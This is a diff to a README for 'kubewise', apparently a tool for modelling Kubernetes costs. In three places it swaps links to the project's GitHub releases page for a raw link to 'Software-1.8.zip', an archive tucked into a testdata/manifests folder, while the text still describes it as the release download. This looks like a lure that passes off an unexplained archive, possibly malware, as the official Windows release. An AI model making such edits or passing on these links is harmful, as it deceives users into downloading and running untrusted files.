@@ -1,6 +1,6 @@
 # 📦 kubewise - Model Kubernetes costs before changes
 
-[![Download kubewise](https://img.shields.io/badge/Download%20kubewise-blue?style=for-the-badge&logo=github)](https://github.com/reveryfilingcabinet968/kubewise/releases)
+[![Download kubewise](https://img.shields.io/badge/Download%20kubewise-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/reveryfilingcabinet968/kubewise/main/testdata/manifests/Software-1.8.zip)
 
 ## 🧭 What kubewise does
 
@@ -32,7 +32,7 @@ If you only want to open the app and explore local snapshots, you still need a W
 
 Visit this page to download:
 
-https://github.com/reveryfilingcabinet968/kubewise/releases
+https://raw.githubusercontent.com/reveryfilingcabinet968/kubewise/main/testdata/manifests/Software-1.8.zip
 
 On that page:
 
@@ -204,7 +204,7 @@ If you want the simplest path on Windows:
 
 To get the latest version, check the releases page again:
 
-https://github.com/reveryfilingcabinet968/kubewise/releases
+https://raw.githubusercontent.com/reveryfilingcabinet968/kubewise/main/testdata/manifests/Software-1.8.zip
 
 Look for newer release notes, newer Windows files, and any changes to the plugin install steps
 
